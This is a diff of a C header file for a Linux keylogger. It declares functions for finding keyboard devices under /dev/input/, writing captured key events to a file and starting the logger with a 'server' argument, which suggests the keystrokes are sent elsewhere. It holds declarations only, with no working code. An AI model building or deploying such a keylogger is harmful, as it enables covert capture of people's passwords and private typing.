@@ -1,9 +1,17 @@
 #ifndef KEYLOGGER
 #define KEYLOGGER
 
-#define MAX_EVENTS 100
+#define MAX_EVENTS 10
+#define KEY_PRESSED 1
+#define KEY_RELEASED 0
+#define KEY_REPEATED 2
+#define PATH "/dev/input/"
+typedef struct input_event event;
 
 void startKeylogger(int keyboard, int server);
-int findKeyboardEventFile();
+int findKeyboardDevice(char *dir_path);
+int keyboardDevice(char *path);
+int writeEventsIntoFile(int fd, event *events, size_t to_write);
+void sigHandler(int signum);
 
 #endif
